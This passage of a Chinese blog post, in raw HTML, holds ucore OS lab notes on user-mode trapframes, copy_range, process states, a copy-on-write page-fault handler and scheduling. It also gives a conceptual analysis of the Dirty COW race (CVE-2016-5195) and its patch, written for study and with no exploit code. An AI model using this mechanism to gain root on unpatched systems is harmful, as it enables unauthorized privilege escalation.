class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//(6) setup trapframe for user environment</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br><span class="hljs-built_in">memset</span>(tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<span class="hljs-comment">//清空tf</span><br><span class="hljs-comment">/* LAB5:EXERCISE1 YOUR CODE</span><br><span class="hljs-comment"> * should set tf_cs,tf_ds,tf_es,tf_ss,tf_esp,tf_eip,tf_eflags</span><br><span class="hljs-comment"> * NOTICE: If we set trapframe correctly, then the user level process can return to USER MODE from kernel. So</span><br><span class="hljs-comment"> *          tf_cs should be USER_CS segment (see memlayout.h)</span><br><span class="hljs-comment"> *          tf_ds=tf_es=tf_ss should be USER_DS segment</span><br><span class="hljs-comment"> *          tf_esp should be the top addr of user stack (USTACKTOP)</span><br><span class="hljs-comment"> *          tf_eip should be the entry point of this binary program (elf-&gt;e_entry)</span><br><span class="hljs-comment"> *          tf_eflags should be set to enable computer to produce Interrupt</span><br><span class="hljs-comment"> */</span><br>tf-&gt;tf_cs = USER_CS;<br><span class="hljs-comment">//答案中好像没有tf_fs?虽然不重要但是不知道为什么不加上</span><br>tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_fs = tf-&gt;tf_ss = USER_DS;<br>tf-&gt;tf_esp = USTACKTOP;<br>tf-&gt;tf_eflags |= FL_IF;<br>tf-&gt;tf_eip= elf-&gt;e_entry;<br>ret = <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><blockquote><p>请在实验报告中描述当创建一个用户态进程并加载了应用程序后，CPU是如何让这个应用程序最终在用户态执行起来的。即这个用户态进程被ucore选择占用CPU执行（RUNNING态）到具体执行应用程序第一条指令的整个经过。</p></blockquote><ul><li><p>当一个用户态程序执行<code>sys_execve</code>时，该程序将触发<code>0x80</code>中断，并进入中断处理例程。与Lab1类似，中断处理例程的入口代码会保存<code>trapframe</code>作为跳转回用户态的上下文环境。但与lab1代码所不同的是，lab5中的<code>trap</code>函数实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">trap</span><span class="hljs-params">(struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">// dispatch based on what type of trap occurred</span><br>    <span class="hljs-comment">// used for previous projects</span><br>    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">NULL</span>)<br>        trap_dispatch(tf);<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 因为可能会发生嵌套中断的情况，所以保存上一次的trapframe</span><br>        struct trapframe *otf = current-&gt;tf;<br>        <span class="hljs-comment">// 注意这一步，设置当前process的栈帧为当前中断栈帧</span><br>        current-&gt;tf = tf;<br>        <span class="hljs-keyword">bool</span> in_kernel = trap_in_kernel(tf);<br>        trap_dispatch(tf);<br>        current-&gt;tf = otf;<br><br>        <span class="hljs-keyword">if</span> (!in_kernel) &#123;<br>            <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING)<br>                do_exit(-E_KILLED);<br>            <span class="hljs-keyword">if</span> (current-&gt;need_resched)<br>                schedule();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>由于<code>trap</code>函数的设计，在<code>do_execve</code>中，此时的<code>current-&gt;tf</code>保存的就是用户态的上下文。</p></li><li><p>因此在执行<code>load_icode</code>函数时，程序只会修改<code>current-&gt;trapframe</code>。因为当中断处理程序返回时，CPU所加载的上下文就是<code>current-&gt;trapframe</code>。</p></li></ul><h3 id="练习2-2"><a href="#练习2-2" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p>do_fork()-&gt;dum_mmap()-&gt;copy_range()的实现</p></blockquote><p>按照page unit来复制内存内容, 这样可以同时更改pte的内容. </p><p>过程概述: 对于vma中的第一个地址start来说, 取出(pde_t *)from中的pte, 用pte2page转换成start地址开始的一个page, 然后用get_pte找到或创建to中start地址对应的pte, 也转换成page(即npage). 然后显而易见的, 我们需要转换page2kva来当做memcpy()的参数来复制整个页的内容, 进一步调用page_insert()来在to中把 虚拟地址start 和 npage 建立映射关系. </p><p>一些细节注释在下面, 整个循环的变量就是不断按照pagesize增加的start虚拟地址.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* copy_range - copy content of memory (start, end) of one process A to another process B</span><br><span class="hljs-comment"> * @to:    the addr of process B&#x27;s Page Directory</span><br><span class="hljs-comment"> * @from:  the addr of process A&#x27;s Page Directory</span><br><span class="hljs-comment"> * @share: flags to indicate to dup OR share. We just use dup method, so it didn&#x27;t be used.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * CALL GRAPH: copy_mm--&gt;dup_mmap--&gt;copy_range</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copy_range</span><span class="hljs-params">(<span class="hljs-keyword">pde_t</span> *to, <span class="hljs-keyword">pde_t</span> *from, <span class="hljs-keyword">uintptr_t</span> start, <span class="hljs-keyword">uintptr_t</span> end, <span class="hljs-keyword">bool</span> share)</span> </span>&#123;<br>    assert(start % PGSIZE == <span class="hljs-number">0</span> &amp;&amp; end % PGSIZE == <span class="hljs-number">0</span>);<br>    assert(USER_ACCESS(start, end));<br>    <span class="hljs-comment">// copy content by page unit.</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//call get_pte to find process A&#x27;s pte according to the addr start</span><br>        <span class="hljs-keyword">pte_t</span> *ptep = get_pte(from, start, <span class="hljs-number">0</span>), *nptep;  <span class="hljs-comment">// nptep for new page table entry pointer</span><br>        <span class="hljs-keyword">if</span> (ptep == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// this page table does not exit, so skip whole memory that mapped by a page table</span><br>            <span class="hljs-comment">// why would this happen?</span><br>            <span class="hljs-comment">// PTSIZE : bytes mapped by a page directory entry</span><br>            start = ROUNDDOWN(start + PTSIZE, PTSIZE);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//call get_pte to find process B&#x27;s pte according to the addr start. If pte is NULL, just alloc a PT</span><br>        <span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) &#123;<br>            <span class="hljs-keyword">if</span> ((nptep = get_pte(to, start, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-keyword">return</span> -E_NO_MEM;<br>            &#125;<br>            <span class="hljs-keyword">uint32_t</span> perm = (*ptep &amp; PTE_USER);<br>            <span class="hljs-comment">//get page from ptep</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> pte2page(*ptep);<br>            <span class="hljs-comment">// alloc a page for process B</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">npage</span> =</span> alloc_page();<br>            assert(page != <span class="hljs-literal">NULL</span>);<br>            assert(npage != <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">/* LAB5:EXERCISE2 YOUR CODE</span><br><span class="hljs-comment">             * (1) find src_kvaddr: the kernel virtual address of page</span><br><span class="hljs-comment">             * (2) find dst_kvaddr: the kernel virtual address of npage</span><br><span class="hljs-comment">             * (3) memory copy from src_kvaddr to dst_kvaddr, size is PGSIZE</span><br><span class="hljs-comment">             * (4) build the map of phy addr of  nage with the linear addr start</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">uintptr_t</span> src_kvaddr, dst_kvaddr;<br>            src_kvaddr = page2kva(page);<br>            dst_kvaddr = page2kva(npage);<br>            <span class="hljs-built_in">memcpy</span>(dst_kvaddr, src_kvaddr, PGSIZE);<br>            ret = page_insert(to, npage, start, perm);<br>            assert(ret == <span class="hljs-number">0</span>);<br>        &#125;<br>        start += PGSIZE;<br>    &#125; <span class="hljs-keyword">while</span> (start != <span class="hljs-number">0</span> &amp;&amp; start &lt; end);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="练习3-1"><a href="#练习3-1" class="headerlink" title="练习3"></a>练习3</h3><blockquote><p>分析fork/exec/wait/exit 和 系统调用的实现</p></blockquote><p>写在知识点里</p><ul><li>请分析fork/exec/wait/exit在实现中是如何影响进程的执行状态的？<ul><li>fork会修改其子进程的状态为<code>PROC_RUNNABLE</code>，而当前进程状态不变。</li><li>exec不修改当前进程的状态，但会替换内存空间里所有的数据与代码。</li><li>wait会先检测是否存在子进程。如果存在进入<code>PROC_ZOMBIE</code>的子进程，则回收该进程并函数返回。但若存在尚处于<code>PROC_RUNNABLE</code>的子进程，则当前进程会进入<code>PROC_SLEEPING</code>状态，并等待子进程唤醒。</li><li>exit会将当前进程状态设置为<code>PROC_ZOMBIE</code>，并唤醒父进程，使其处于<code>PROC_RUNNABLE</code>的状态，之后主动让出CPU。</li></ul></li><li>请给出ucore中一个用户态进程的执行状态生命周期图（包括执行状态，执行状态之间的变换关系，以及产生变换的事件或函数调用）。<a href="https://kiprey.github.io/2020/08/uCore-5/#Questions">link</a> </li></ul><pre><code class=" mermaid">stateDiagram-v2[*]--&gt;UNINIT : alloc_procUNINIT--&gt;RUNNABLE : proc_init/wakeup_procRUNNING--&gt;SLEEPING : try_free_pages/do_wait/do_sleepRUNNING--&gt;ZOMBIE : do_exitRUNNABLE--&gt;RUNNING :调度器调度RUNNING--&gt;RUNNABLE :时间片耗尽SLEEPING--&gt;RUNNABLE : wakeup_procZOMBIE--&gt;[*]:资源回收</code></pre><h3 id="Big-Challenge-Dirty-COW"><a href="#Big-Challenge-Dirty-COW" class="headerlink" title="Big Challenge: Dirty COW"></a>Big Challenge: Dirty COW</h3><blockquote><p><strong>实现 Copy on Write （COW）机制</strong> </p><p>同时，由于COW实现比较复杂，容易引入bug，请参考 <a href="https://dirtycow.ninja/">Dirty COW (CVE-2016-5195)</a> 看看能否在ucore的COW实现中模拟这个错误和解决方案。需要有解释。</p><p>这是一个big challenge.</p></blockquote><p><a href="https://www.cnblogs.com/BlueR1ver/p/15758828.html">blog</a> </p><p><a href="https://zhuanlan.zhihu.com/p/439091715">从零入门linux内核安全：脏牛提权漏洞分析与补丁分析(CVE-2016-5195)</a> </p><p>[<a href="https://bbs.pediy.com/thread-264199.htm#msg_header_h3_0">原创]Linux内核[CVE-2016-5195] (dirty COW)原理分析</a> </p><h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1. 思路"></a>1. 思路</h4><p><strong>写时复制</strong>（<strong>Copy-on-write</strong>，简称<strong>COW</strong>）是一种计算机程序设计领域的优化策略。其核心思想是，如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会使用指针指向相同的资源，直到<strong>某个调用者</strong>试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。</p><p>具体到ucore而言, 当一个用户父进程创建自己的子进程时，缺页处理例程会把父子进程的页表项改为<strong>只读</strong>，子进程可共享父进程占用的用户内存空间中的页面（这就是一个共享的资源）。当其中任何一个进程修改此用户内存空间中的某页面时，ucore会通过page fault异常获知该操作，并完成拷贝内存页面，使得两个进程都有各自的内存页面。这样一个进程所做的修改不会被另外一个进程可见了。</p><h4 id="2-具体实现"><a href="#2-具体实现" class="headerlink" title="2. 具体实现"></a>2. 具体实现</h4><ul><li><p>当进行内存访问时，CPU会根据PTE上的读写位<code>PTE_P</code>、<code>PTE_W</code>来确定当前内存操作是否允许，如果不允许，则缺页中断。我们可以在<code>copy_range</code>函数中，将父进程中所有PTE中的<code>PTE_W</code>置为0，这样便可以将父进程中所有空间都设置为只读。然后使子进程的PTE全部指向父进程中PTE存放的物理地址，这样便可以达到内存共享的目的。</p><blockquote><p>为什么要设置父进程所有空间为只读呢，因为在之后的内存操作中，如果对这些空间进行写操作的话，程序就会触发缺页中断，那么CPU就可以在缺页中断程序中复制该内存，也就是写时复制。</p></blockquote><blockquote><p>为什么在copy_range函数中实现内存共享呢？因为我们可以在该函数中对其传入的<code>share</code>参数进行处理。</p></blockquote><p>最终实现把拷贝内存的部分换成复制一下pte的内容就可以了:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">...         <span class="hljs-keyword">if</span>(share)<br>            &#123;<br>                cprintf(<span class="hljs-string">&quot;Sharing the page 0x%x\n&quot;</span>, page2kva(page));<br>                <span class="hljs-comment">// 物理页面共享，并设置两个PTE上的标志位为只读</span><br>                page_insert(from, page, start, perm &amp; ~PTE_W);<br>                ret = page_insert(to, page, start, perm &amp; ~PTE_W);<br>            &#125;<br>            <span class="hljs-comment">// 完整拷贝内存</span><br>            <span class="hljs-keyword">else</span><br>            &#123;<br>...<br>            &#125; ...<br></code></pre></div></td></tr></table></figure></li><li><p>当某个进程想写入一个共享内存时，由于PTE上的<code>PTE_W</code>为0，所以会触发缺页中断处理程序。此时进程需要在缺页中断处理程序中复制该页内存，并设置该页内存所对应的<code>PTE_W</code>为1。</p><blockquote><p>需要注意的是，在执行缺页中断处理程序中的内存复制操作前，需要先检查该物理页的引用次数。如果该引用次数已经为1了，则表明此时的物理页只有当前进程所使用，故可以直接设置该页内存所对应的<code>PTE_W</code>为1即可，不需要进行内存复制。</p></blockquote><p>最终实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_pgfault</span><span class="hljs-params">(struct mm_struct *mm, <span class="hljs-keyword">uint32_t</span> error_code, <span class="hljs-keyword">uintptr_t</span> addr)</span> </span>&#123;<br>    <span class="hljs-comment">// ........</span><br>   <span class="hljs-comment">// 查找当前虚拟地址所对应的页表项</span><br>    <span class="hljs-keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>        cprintf(<span class="hljs-string">&quot;get_pte in do_pgfault failed\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// 如果这个页表项所对应的物理页不存在，则</span><br>    <span class="hljs-keyword">if</span> (*ptep == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 分配一块物理页，并设置页表项</span><br>        <span class="hljs-keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="hljs-literal">NULL</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//不为空说明需要swap或者COW</span><br>        struct Page *page=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// 如果当前页错误的原因是写入了只读页面</span><br>        <span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) &#123;<br>            <span class="hljs-comment">// 写时复制：复制一块内存给当前进程</span><br>            cprintf(<span class="hljs-string">&quot;\n\nCOW: ptep 0x%x, pte 0x%x\n&quot;</span>,ptep, *ptep);<br>            <span class="hljs-comment">// 原先所使用的只读物理页</span><br>            page = pte2page(*ptep);<br>            <span class="hljs-comment">// 如果该物理页面被多个进程引用</span><br>            <span class="hljs-keyword">if</span>(page_ref(page) &gt; <span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-comment">// 释放当前PTE的引用并分配一个新物理页</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span>* <span class="hljs-title">newPage</span> =</span> pgdir_alloc_page(mm-&gt;pgdir, addr, perm);<br>                <span class="hljs-keyword">void</span> * kva_src = page2kva(page);<br>                <span class="hljs-keyword">void</span> * kva_dst = page2kva(newPage);<br>                <span class="hljs-comment">// 拷贝数据</span><br>                <span class="hljs-built_in">memcpy</span>(kva_dst, kva_src, PGSIZE);<br>            &#125;<br>            <span class="hljs-comment">// 如果该物理页面只被当前进程所引用,即page_ref等1</span><br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-comment">// 则可以直接执行page_insert，保留当前物理页并重设其PTE权限。</span><br>                page_insert(mm-&gt;pgdir, page, addr, perm);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-comment">// 如果swap已经初始化完成</span><br>            <span class="hljs-keyword">if</span>(swap_init_ok) &#123;<br>                <span class="hljs-comment">// 将目标数据加载到某块新的物理页中。</span><br>                <span class="hljs-comment">// 该物理页可能是尚未分配的物理页，也可能是从别的已分配物理页中取的</span><br>                <span class="hljs-keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="hljs-number">0</span>) &#123;<br>                    cprintf(<span class="hljs-string">&quot;swap_in in do_pgfault failed\n&quot;</span>);<br>                    <span class="hljs-keyword">goto</span> failed;<br>                &#125;<br>                <span class="hljs-comment">// 将该物理页与对应的虚拟地址关联，同时设置页表。</span><br>                page_insert(mm-&gt;pgdir, page, addr, perm);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                cprintf(<span class="hljs-string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);<br>                <span class="hljs-keyword">goto</span> failed;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 当前缺失的页已经加载回内存中，所以设置当前页为可swap。</span><br>        swap_map_swappable(mm, addr, page, <span class="hljs-number">1</span>);<br>        page-&gt;pra_vaddr = addr;<br>   &#125;<br>   ret = <span class="hljs-number">0</span>;<br>failed:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="3-Dirty-COW浅析"><a href="#3-Dirty-COW浅析" class="headerlink" title="3.Dirty COW浅析"></a>3.Dirty COW浅析</h4><h5 id="0x00-关于linux内核背景知识"><a href="#0x00-关于linux内核背景知识" class="headerlink" title="0x00 关于linux内核背景知识"></a>0x00 关于linux内核背景知识</h5><p>和ucore非常相似, 比如mm_struct, vma, copy_range一些函数. 下面是这个漏洞的相关背景.</p><ul><li><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">madvise</a>(): 内核对该区域的用户虚拟内存应遵循特定的使用模式<ul><li>MADV_DONTNEED参数:</li></ul></li><li><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a>():<ul><li>MAP_PRIVATE参数: Create a private copy-on-write mapping.  Updates to the mapping are not visible to other processes mapping the same file, and are not carried through to the underlying file. </li></ul></li></ul><h5 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h5><p>该漏洞是Linux的一个本地提权漏洞，发现者是Phil Oester，影响&gt;=2.6.22的所有Linux内核版本，修复时间是2016年10月18号。该漏洞的原因是<code>get_user_page</code>内核函数在处理<code>Copy-on-Write</code>(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。当我们向带有MAP_PRIVATE标记的只读文件映射区域写数据时，会产生一个映射文件的复制(COW)，对此区域的任何修改都不会写回原来的文件，如果上述的竞态条件发生，就能成功的写回原来的文件。比如我们修改su或者passwd程序就可以达到root提权的目的。</p><h5 id="0x02-POC分析"><a href="#0x02-POC分析" class="headerlink" title="0x02 POC分析"></a>0x02 POC分析</h5><p>首先打开我们需要修改的只读文件并使用<code>MAP_PRIVATE</code>标记映射文件到内存区域，然后启动两个线程：</p><ul><li>其中一个线程向文件映射的内存区域写数据，这时内核采用COW机制。</li><li>另一个线程使用带MADV_DONTNEED参数的madvise系统调用将文件映射内存区域释放，达到干扰另一个线程的COW过程，产生竞态条件，</li></ul><p>当竞态条件发生时就能写入文件成功。</p><h5 id="0x03-大致流程"><a href="#0x03-大致流程" class="headerlink" title="0x03 大致流程"></a>0x03 大致流程</h5><p>当我们用mmap去映射文件到内存区域时使用了<code>MAP_PRIVATE</code>标记，我们写文件时会写到COW机制产生的内存区域中，原文件不受影响。其中获取用户进程内存页的过程如下：</p><ol><li>第一次调用<code>follow_page_mask</code>查找虚拟地址对应的page，带有<code>FOLL_WRITE</code>标记。因为所在page不在内存中，<code>follow_page_mask</code>返回NULL，第一次失败，进入<code>faultin_page</code>，最终进入<code>do_cow_fault</code>分配不带<code>_PAGE_RW</code>标记的匿名内存页，返回值为0。</li><li>重新开始循环，第二次调用<code>follow_page_mask</code>，带有<code>FOLL_WRITE</code>标记。由于不满足<code>((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte))</code>条件，<code>follow_page_mask</code>返回NULL，第二次失败，进入<code>faultin_page</code>，最终进入<code>do_wp_page</code>函数分配COW页。并在上级函数<code>faultin_page</code>中去掉<code>FOLL_WRITE</code>标记,返回0。</li><li>重新开始循环，第三次调用<code>follow_page_mask</code>，不带<code>FOLL_WRITE</code>标记。成功得到page。</li></ol><p>产生竞态条件:</p><ol><li>第一次<code>follow_page_mask(FOLL_WRITE)</code>，page不在内存中，进行pagefault处理。</li><li>第二次<code>follow_page_mask(FOLL_WRITE)</code>，page没有写权限，**并去掉<code>FOLL_WRITE</code>**。</li><li>另一个线程释放上一步分配的COW页</li><li>第三次<code>follow_page_mask(无FOLL_WRITE)</code>，page不在内存中，进行pagefault处理。</li><li>第四次<code>follow_page_mask(无FOLL_WRITE)</code>,成功返回page，但没有使用COW机制。</li></ol><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619">patch 链接</a></p><p>现在不再是把 FOLL_WRITE 标记去掉，而是添加了一个 FOLL_COW 标志来表示获取一个 COW 分配的页。即使是竞态条件破坏了一次完整的获取页的过程，但是因为 FOLL_WRITE 标志还在，所以会重头开始分配一个 COW 页，从而保证该过程的完整性。</p><h1 id="Lab6"><a href="#Lab6" class="headerlink" title="Lab6"></a>Lab6</h1><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目组成-2"><a href="#0-项目组成-2" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><p>相对与实验五，实验六主要增加的文件如上表红色部分所示，主要修改的文件如上表紫色部分所示。主要改动如下： 简单说明如下：</p><ul><li>libs/skew_heap.h: 提供了基本的优先队列数据结构，为本次实验提供了抽象数据结构方面的支持。</li><li>kern/process/proc.[ch]：proc.h中扩展了proc_struct的成员变量，用于RR和stride调度算法。proc.c中实现了lab6_set_priority，用于设置进程的优先级。</li><li>kern/schedule/{sched.h,sched.c}: 定义了 ucore 的调度器框架，其中包括相关的数据结构（包括调度器的接口和运行队列的结构），和具体的运行时机制。</li><li>kern/schedule/{default_sched.h,default_sched.c}: 具体的 round-robin 算法，在本次实验中你需要了解其实现。</li><li>kern/schedule/default_sched_stride_c: Stride Scheduling调度器的基本框架，在此次实验中你需要填充其中的空白部分以实现一个完整的 Stride 调度器。</li><li>kern/syscall/syscall.[ch]: 增加了sys_gettime系统调用，便于用户进程获取当前时钟值；增加了sys_lab6_set_priority系统调用，便于用户进程设置进程优先级（给priority.c用）</li><li>user/{matrix.c,priority.c,. . . }: 相关的一些测试用户程序，测试调度算法的正确性，user目录下包含但不限于这些程序。在完成实验过程中，建议阅读这些测试程序，以了解这些程序的行为，便于进行调试。</li></ul><h3 id="1-流程概述"><a href="#1-流程概述" class="headerlink" title="1.流程概述"></a>1.流程概述</h3><p>实验中涉及了idle进程的概念。当cpu没有进程可以执行的时候，系统应该如何工作？在实验五的scheduler实现中，ucore内核不断的遍历进程池，直到找到第一个runnable状态的 process，调用并执行它。也就是说，当系统没有进程可以执行的时候，它会把所有 cpu 时间用在搜索进程池，以实现 idle的目的。但是这样的设计不被大多数操作系统所采用，原因在于它将进程调度和 idle 进程两种不同的概念混在了一起，而且，当调度器比较复杂时，schedule 函数本身也会比较复杂，这样的设计结构很不清晰而且难免会出现错误。所以在此次实验中，ucore建立了一个单独的进程(kern/process/proc.c 中的 idleproc)作为 cpu 空闲时的 idle 进程，这个程序是通常一个死循环。你需要了解这个程序的实现。</p><h3 id="2-新增的内容"><a href="#2-新增的内容" class="headerlink" title="2.新增的内容"></a>2.新增的内容</h3><p>ucore定义的进程控制块struct proc_struct包含了成员变量state,用于描述进程的运行状态，而running和runnable共享同一个状态(state)值PROC_RUNNABLE。</p><p>Lab5中有一个全局变量<code>list_entry_t proc_list</code>, 用来存放所有的进程, wakeup_proc()函数只要设置进程为PROC_RUNNABLE, 然后调度函数再遍历proc_list就能取出下一个进程.</p><p>在Lab6中，runnable的进程会被放在运行队列<code>struct run_queue *rq</code>中。值得注意的是，不同之处在于处于running态的进程不会放在运行队列中, 会被直接dequeue.</p><h2 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h2><h3 id="练习0-1"><a href="#练习0-1" class="headerlink" title="练习0"></a>练习0</h3><blockquote><p>填写前几个lab的代码并且补充一些内容</p></blockquote><p>遇到了大问题, 最后clone了肖佬的Lab6, 然后改成我自己的代码才过了编译. 实在无法理解为什么会在check_pgfault()这函数上出错.</p><h3 id="练习1-3"><a href="#练习1-3" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>分析了解lab6采用RR调度算法后的执行过程</p></blockquote><figure class="highlight c"><table><tr><td class="gutter 